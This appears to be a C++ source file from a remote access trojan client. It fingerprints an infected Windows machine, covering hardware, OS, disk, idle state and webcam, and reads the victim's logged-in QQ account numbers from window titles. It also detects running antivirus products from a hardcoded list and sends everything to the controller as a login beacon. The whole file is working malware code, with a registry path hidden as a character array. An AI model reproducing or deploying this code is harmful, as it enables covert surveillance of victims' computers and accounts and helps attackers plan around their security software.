
#include <STDLIB.H>
#include <iphlpapi.h> //网络速率头
#pragma comment ( lib, "iphlpapi.lib" ) 
/********************************************************************************************************

                                      _oo0oo_
                                     o8888888o
                                     88" . "88
                                     (| -_- |)
                                     0\  =  /0
                                   ___/`---'\___
                                 .' \\|     |// '.
                                / \\|||  :  |||// \
                               / _||||| -:- |||||- \
                              |   | \\\  -  /// |   |
                              | \_|  ''\---/''  |_/ |
                              \  .-\__  '-'  ___/-. /
                            ___'. .'  /--.--\  `. .'___
                         ."" '<  `.___\_<|>_/___.' >' "".
                        | | :  `- \`.;`\ _ /`;.`/ - ` : | |
                        \  \ `_.   \_ __\ /__ _/   .-` /  /
                    =====`-.____`.___ \_____/___.-`___.-'=====
                                      `=---='
                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

                          佛祖保佑    永无BUG    永不修改


********************************************************************************************************/

extern CHAR NtrServiceName[100];   //服务名称
extern CHAR NtrVersion[32];   //服务名称
extern CHAR NtrBuildtime[100];   //服务名称
// Get System Information CPU
DWORD CPUClockMhzt()
{
	char str1[256]="~M";
	char str2[256]="Hz";
	strcat(str1,str2);

	char xYKTm[] = {'H','A','R','D','W','A','R','E','\\','D','E','S','C','R','I','P','T','I','O','N','\\','S','y','s','t','e','m','\\','C','e','n','t','r','a','l','P','r','o','c','e','s','s','o','r','\\','0','\0'};
	HKEY	hKey;
	DWORD	dwCPUMhz;
	DWORD	dwBytes = sizeof(DWORD);
	DWORD	dwType = REG_DWORD;
	RegOpenKey(HKEY_LOCAL_MACHINE, xYKTm, &hKey);
	RegQueryValueEx(hKey, str1, NULL, &dwType, (PBYTE)&dwCPUMhz, &dwBytes);
	RegCloseKey(hKey);
	return	dwCPUMhz;
}


void GetHostRemark(LPTSTR lpBuffer, UINT uSize ,LPTSTR strSubKey)
{
	memset(lpBuffer, 0, uSize);
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey,"Remark", REG_SZ, lpBuffer, NULL,uSize, 0);

	if (lstrlen(lpBuffer) == 0)
		gethostname(lpBuffer, uSize);
}


//操作系统
BOOL GetNtVersionNumbers(DWORD&dwMajorVer, DWORD& dwMinorVer,DWORD& dwBuildNumber)
{
    BOOL bRet= FALSE;
    HMODULE hModNtdll= NULL;
    if (hModNtdll= ::LoadLibraryW(L"ntdll.dll"))
    {
        typedef void (WINAPI *pfRTLGETNTVERSIONNUMBERS)(DWORD*,DWORD*, DWORD*);
        pfRTLGETNTVERSIONNUMBERS pfRtlGetNtVersionNumbers;
        pfRtlGetNtVersionNumbers = (pfRTLGETNTVERSIONNUMBERS)::GetProcAddress(hModNtdll, "RtlGetNtVersionNumbers");
        if (pfRtlGetNtVersionNumbers)
        {
			pfRtlGetNtVersionNumbers(&dwMajorVer, &dwMinorVer,&dwBuildNumber);
			dwBuildNumber&= 0x0ffff;
			bRet = TRUE;
        }
		
        ::FreeLibrary(hModNtdll);
        hModNtdll = NULL;
    }
	
    return bRet;
}

//在线QQ
char *GetQQ()
{
	char *szQQNum = new char[2048];
	memset(szQQNum, 0, 260);
	char szText[2048] = {0};
    char szQQNumber[2048] = {0};
    HWND hWnd = FindWindowA("CTXOPConntion_Class", NULL);
	
	while (hWnd)
	{
		char szClassName[MAX_PATH] = {0};
		GetClassName(hWnd, szClassName, MAX_PATH);
		if (strcmp(szClassName, "CTXOPConntion_Class") == 0)
		{	
			// 得到类似OP_12345678的字符串
			if (hWnd)
			{
				GetWindowText(hWnd, szText, MAX_PATH);
			}
			// 得到12345678 qq号
			int len = strlen(szText);
			do
			{
				len--;
			} while (szText[len] != '_');
			strcpy(szQQNumber, &szText[len+1]);
			if (lstrlen(szQQNum) != 0)
			{	
				strcat(szQQNum, "|");
			}
			strcat(szQQNum, szQQNumber);
		}
		hWnd = GetWindow(hWnd, GW_HWNDNEXT);
	}
	if (lstrlen(szQQNum) == 0)
	{
		strcpy(szQQNum, "Null");
	}
	return szQQNum;
}

//网卡
int GetNetwork()//获取网络速率Mbps 
{
	DWORD dwSize = 0;
	DWORD dwRetVal = 0;
	DWORD speed = 0; 
	DWORD dwspeed = 0;
	MIB_IFTABLE *pIfTable;
	MIB_IFROW *pIfRow;       
	
	
	pIfTable = (MIB_IFTABLE *) malloc(sizeof (MIB_IFTABLE));
	if (pIfTable == NULL) 
	{
		return 1;
	}
	dwSize = sizeof (MIB_IFTABLE);
	if (GetIfTable(pIfTable, &dwSize, FALSE) == ERROR_INSUFFICIENT_BUFFER) 
	{
		free( pIfTable);
		pIfTable = (MIB_IFTABLE *) malloc(dwSize);
		if (pIfTable == NULL) 
		{
			return 1;
		}
	}
	
	if ((dwRetVal = GetIfTable(pIfTable, &dwSize, FALSE)) == NO_ERROR) 
	{        
		pIfRow = (MIB_IFROW *) & pIfTable->table[0];
		speed = pIfRow->dwSpeed;
		dwspeed = speed/1000/1000; //mbps        
	} 
	if (pIfTable != NULL) 
	{
		free(pIfTable);
		pIfTable = NULL;
	}
	
	return dwspeed;
}

//////////////////////////////////////////////////////////
//枚举视频设备
/*************判断视频的头文件*******************/
#include <strmif.h>
#include <uuids.h>
#pragma comment(lib, "strmiids.lib")
/**********************************/

//////////////////////////////////////////////////////////
UINT EnumDevices()
{
	UINT nCam = 0;
	CoInitialize(NULL);    //COM 库初始化
	/////////////////////    Step1        /////////////////////////////////
	//枚举捕获设备
	ICreateDevEnum *pCreateDevEnum;                          //创建设备枚举器
	//创建设备枚举管理器
	HRESULT hr = CoCreateInstance(CLSID_SystemDeviceEnum,    //要创建的Filter的Class ID
		NULL,                                                //表示Filter不被聚合
		CLSCTX_INPROC_SERVER,                                //创建进程内COM对象
		IID_ICreateDevEnum,                                  //获得的接口ID
		(void**)&pCreateDevEnum);                            //创建的接口对象的指针
	if (hr != NOERROR)
	{
		//	d(_T("CoCreateInstance Error"));
		return FALSE;
	}
	/////////////////////    Step2        /////////////////////////////////
	IEnumMoniker *pEm;                 //枚举监控器接口
	//获取视频类的枚举器
	hr = pCreateDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEm, 0);
	//如果想获取音频类的枚举器，则使用如下代码
	//hr=pCreateDevEnum->CreateClassEnumerator(CLSID_AudioInputDeviceCategory, &pEm, 0);
	if (hr != NOERROR)
	{
		//d(_T("hr != NOERROR"));
		return FALSE;
	}
	/////////////////////    Step3        /////////////////////////////////
	pEm->Reset();                                            //类型枚举器复位
	ULONG cFetched;
	IMoniker *pM;                                            //监控器接口指针
	while(hr = pEm->Next(1, &pM, &cFetched), hr==S_OK)       //获取下一个设备
	{
		IPropertyBag *pBag;                                  //属性页接口指针
		hr = pM->BindToStorage(0, 0, IID_IPropertyBag, (void **)&pBag);
		//获取设备属性页
		if(SUCCEEDED(hr)) 
		{
            VARIANT var;
            var.vt = VT_BSTR;                                //保存的是二进制数据
            hr = pBag->Read(L"FriendlyName", &var, NULL);
			//获取FriendlyName形式的信息
            if (hr == NOERROR) 
            {
				nCam++;
				SysFreeString(var.bstrVal);   //释放资源，特别要注意
            }
            pBag->Release();                  //释放属性页接口指针
        }
        pM->Release();                        //释放监控器接口指针
    }
	CoUninitialize();                   //卸载COM库
	return nCam;
}
//////////////////////////////////////////////////////////

bool IsWebCam()
{
	bool	bRet = false;
	
	if (EnumDevices()>0)
	{
        bRet = TRUE;
	}
	return bRet;
}


/////////////////杀毒显示//////////////////////////////////
typedef struct
{
	char *Course;
	char *Name;
}AYSDFE;


AYSDFE g_Ayadfe_Datas[40] =
{
	{"360tray.exe",       "360安全卫士"},
	{"360sd.exe",         "360杀毒"},
	{"kxetray.exe",       "金山毒霸"},
	{"KSafeTray.exe",     "金山安全卫士"},
	{"QQPCRTP.exe",       "QQ电脑管家"},
	{"BaiduSd.exe",       "百度杀毒"},
	{"baiduSafeTray.exe", "百度卫士"},
	{"KvMonXP.exe",       "江民"},
	{"RavMonD.exe",       "瑞星"},
	{"QUHLPSVC.EXE",      "QuickHeal"},//印度
	{"mssecess.exe",      "微软MSE"},
	{"cfp.exe",           "Comodo杀毒"},
	{"SPIDer.exe",        "DR.WEB"},//大蜘蛛
	{"acs.exe",           "Outpost"},
	{"V3Svc.exe",         "安博士V3"},
	{"AYAgent.aye",       "韩国胶囊"},
	{"avgwdsvc.exe",      "AVG"},
	{"f-secure.exe",      "F-Secure"},//芬安全
	{"avp.exe",           "卡巴"},
	{"Mcshield.exe",      "麦咖啡"},
	{"egui.exe",          "NOD32"},
	{"knsdtray.exe",      "可牛"},
	{"TMBMSRV.exe",       "趋势"},
	{"avcenter.exe",      "小红伞"},
	{"ashDisp.exe",       "Avast网络安全"}, 
	{"rtvscan.exe",       "诺顿"}, 
	{"remupd.exe",        "熊猫卫士"},
	{"vsserv.exe",        "BitDefender"},//BD  bdagent.exe
	{"PSafeSysTray.exe",  "PSafe反病毒"},//巴西
	{"ad-watch.exe",      "Ad-watch反间谍"}, 
	{"K7TSecurity.exe",   "K7杀毒"}, 
	{"UnThreat.exe",      "UnThreat"},//保加利亚
	{"  ",    "  "}
	
};

char* GetVirus()
{	
	static char AllName[1024];
	int t=0;
	memset(AllName, 0, sizeof(AllName));
	while(1)
	{
		if (strstr(g_Ayadfe_Datas[t].Course, " " )  == 0 )
		{	
			if (GetProcessID(g_Ayadfe_Datas[t].Course)) 
			{
				lstrcat( AllName, g_Ayadfe_Datas[t].Name);
				lstrcat( AllName, " " );
			}
		}
		else
			break;
		t++;
	}
	
	if (strstr(AllName, " " )  == 0 )
	{	
		lstrcat(AllName , " Null ");
	}
	
	return AllName;
}


//发送上线信息
int SendLoginInfo(CClientSocket *pClient, DWORD dwSpeed)
{
	// 登录信息
	LOGININFO	LoginInfo;

	// 开始构造数据
	LoginInfo.bToken = TOKEN_LOGIN; // 令牌为登录

 	char strSubKey[MAX_PATH];

	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", NtrServiceName);



	// 连接的IP地址
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	getsockname(pClient->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);

	memcpy(&LoginInfo.IPAddress, (void *)&sockAddr.sin_addr, sizeof(IN_ADDR));

	// 主机名
	GetHostRemark( LoginInfo.HostName, sizeof(LoginInfo.HostName),strSubKey);


	// 操作系统
	LoginInfo.OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO *)&LoginInfo.OsVerInfoEx); // 注意转换类型
	GetNtVersionNumbers(LoginInfo.OsVerInfoEx.dwMajorVersion,LoginInfo.OsVerInfoEx.dwMinorVersion,LoginInfo.OsVerInfoEx.dwBuildNumber);
	
	// CPU
	LoginInfo.dwCPUClockMhz = CPUClockMhzt();
	SYSTEM_INFO SysInfo;//用于获取CPU个数的
	GetSystemInfo(&SysInfo);
	LoginInfo.nCPUNumber = SysInfo.dwNumberOfProcessors;
	
	//内存大小
    MEMORYSTATUSEX	MemInfo; //用GlobalMemoryStatusEx可显示2G以上内存
    MemInfo.dwLength=sizeof(MemInfo); 
    GlobalMemoryStatusEx(&MemInfo);
	DWORDLONG strMem = MemInfo.ullTotalPhys/1024/1024;
	LoginInfo.MemSize = (unsigned long)strMem;
	DWORDLONG FreeMemory = MemInfo.ullAvailPhys/1024/1024;
	LoginInfo.FreeMemSize = (unsigned long)FreeMemory;

	//硬盘空间
	ULARGE_INTEGER nTotalBytes,nTotalFreeBytes,nTotalAvailableBytes;
	ULONG nAllGB = 0, nFreeGB = 0;
    DWORD drivertype;
    CHAR driver[10], strPrint[128];
    for(int i=0; i<26; i++)
    {
		driver[0] = i + ('B');
		driver[1] = (':');
		driver[2] = ('\\');
		driver[3] = 0;
		
		drivertype = GetDriveType(driver);
        if(drivertype!=DRIVE_FIXED)
			continue;
		GetDiskFreeSpaceEx(driver,//盘符
			&nTotalAvailableBytes,
			&nTotalBytes,//总硬盘大小
			&nTotalFreeBytes); //剩余硬盘大小
		nAllGB = nAllGB + nTotalBytes.QuadPart/1024/1024/1024;
		nFreeGB = nFreeGB + nTotalFreeBytes.QuadPart/1024/1024/1024;
    }
	// 硬盘
	LoginInfo.DriverSize = nAllGB;
	// 可用硬盘
	LoginInfo.FreeDriverSize = nFreeGB;


	//用户
	LoginInfo.bIsActive = false;
	//是否活动
	LASTINPUTINFO lpi;
	lpi.cbSize = sizeof(lpi);
	GetLastInputInfo(&lpi);//获取上次输入操作的时间。
	if ((::GetTickCount()-lpi.dwTime)>1000*60*3)//5分钟
	{
		//当前系统已经空闲了1分钟
        LoginInfo.bIsActive = true;
	}
	

	// Speed
	LoginInfo.dwSpeed = dwSpeed;


	//在线QQ
	strcpy( LoginInfo.nQQ, GetQQ() );

	// 网卡
	LoginInfo.Speed = GetNetwork();

	//摄像头
	LoginInfo.bIsWebCam = IsWebCam();

	// 杀毒软件
    strcpy( LoginInfo.Virus, GetVirus() );
	
	//分组
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", NtrServiceName);
	memset(LoginInfo.UpGroup,0,sizeof(LoginInfo.UpGroup));
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey,"Group", REG_SZ, LoginInfo.UpGroup, NULL,lstrlen(LoginInfo.UpGroup), 0);

    //上线版本
	strcpy(LoginInfo.szVersion, NtrVersion);

	//配置时间
	strcpy(LoginInfo.BuildTime, NtrBuildtime);

	int nRet = pClient->Send((LPBYTE)&LoginInfo, sizeof(LOGININFO));

	return nRet;
}

